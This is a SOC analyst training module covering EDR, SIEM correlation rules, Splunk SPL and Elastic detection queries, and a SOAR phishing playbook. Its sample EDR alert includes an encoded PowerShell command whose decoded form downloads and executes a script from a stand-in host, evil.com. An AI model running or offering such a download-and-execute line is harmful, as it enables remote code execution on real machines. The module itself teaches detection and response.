Module 3: Core SOC Solutions

This module covers the three core technologies every SOC analyst must know: EDR (Endpoint Detection & Response), SIEM (Security Information & Event Management), and SOAR (Security Orchestration, Automation & Response).

Sub-Domains / Rooms

🔹 Introduction to EDR

EDR agents sit on endpoints (laptops, servers, workstations) and continuously monitor for suspicious activity. When threats are detected, the EDR can isolate the host, kill processes, and provide forensic data.

EDR Capabilities:
- Process monitoring: Every running process, parent-child relationships
- File monitoring: File creations, modifications, deletions
- Registry monitoring: New run keys, service installations
- Network monitoring: Outbound connections, port usage
- Memory scanning: Detect injected code, process hollowing
- Response actions: Isolate host, kill process, block hash, collect forensics

Example EDR Alert: "Powershell.exe launched from Microsoft Word with encoded command"
EDR shows: Parent=WINWORD.EXE, Child=powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQAKAA=='
Decoded: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
Response: Isolate host → Kill process → Block file hash → Collect full forensic package

🔹 Introduction to SIEM

A SIEM aggregates logs from across the organization (firewalls, servers, endpoints, cloud) and provides analysis, correlation, alerting, and dashboards.

SIEM Data Flow:
Data Sources (Windows, Linux, Firewall, EDR, Cloud) → Log Forwarders (Universal Forwarder, Beats) → SIEM Engine (Indexing, Parsing, Normalization) → Correlation Rules → Alerts → Dashboards → Analysts

Example SIEM Correlation Rule: "Brute Force Detection"
Rule: When (EventID=4625 AND logon_type=3 AND count > 10 within 5 minutes) from same Source_IP
Result: Alert with severity=HIGH, assign to L1 SOC queue
When this rule triggers, the SIEM creates an alert with context: the source IP, target username, number of attempts, and time window.

🔹 Splunk: The Basics

Splunk is the most widely used SIEM in enterprise SOCs. Its query language is SPL (Search Processing Language).

Common SPL Commands:
index=windows EventID=4625 | stats count by Account_Name, Source_IP | sort -count
→ Counts failed logins grouped by username and source IP, sorted by most attempts

index=network src_ip=10.0.1.50 | timechart count by dest_ip
→ Shows outbound connections over time from a specific host

index=proxy url="*.exe" | stats count by url, user | where count > 5
→ Finds users downloading executables via proxy, filter for download-heavy users

index=windows EventID=4688 | search ParentImage=*WINWORD* AND Image=*powershell*
→ Detects Microsoft Office spawning PowerShell (classic phishing indicator)

🔹 Elastic Stack: The Basics

The Elastic Stack (ELK: Elasticsearch, Logstash, Kibana) is a free and open-source alternative to Splunk. Elasticsearch stores and indexes logs, Logstash ingests and transforms data, and Kibana provides visualization and dashboards.

Elastic Stack Example:
Kibana Query (EQL):
process where event.code == "1" and process.parent.name == "WINWORD.EXE" and process.name == "powershell.exe"
→ Same detection as the Splunk query — Office spawning PowerShell

Detection Rule (Elastic Security):
sequence by host.ip
[process where event.code == "1" and process.name == "powershell.exe"]
[network where process.name == "powershell.exe" and destination.port == 443]
→ Detects PowerShell that also makes a network connection (potential C2)

🔹 Introduction to SOAR

SOAR automates repetitive SOC tasks. When a SIEM alert fires, SOAR can automatically enrich the alert with threat intel, create a ticket, and even take containment actions.

SOAR Playbook Example — "Phishing Response":
1. Trigger: User reports phishing email via Outlook plugin
2. SOAR extracts: Sender, Subject, Links, Attachments, Headers
3. Automation: Submit URLs to URLScan.io, submit attachments to sandbox, check sender reputation on VirusTotal
4. Enrichment: Add reputation scores, geo-location, domain age to incident
5. Decision: If malicious (score > 5/10) → block at email gateway, block URLs at proxy, delete from all inboxes
6. Notification: Notify SOC team, send phishing alert to all employees
7. Ticketing: Create incident ticket with all evidence attached
Total time saved: ~30 minutes per incident → 3+ hours per day
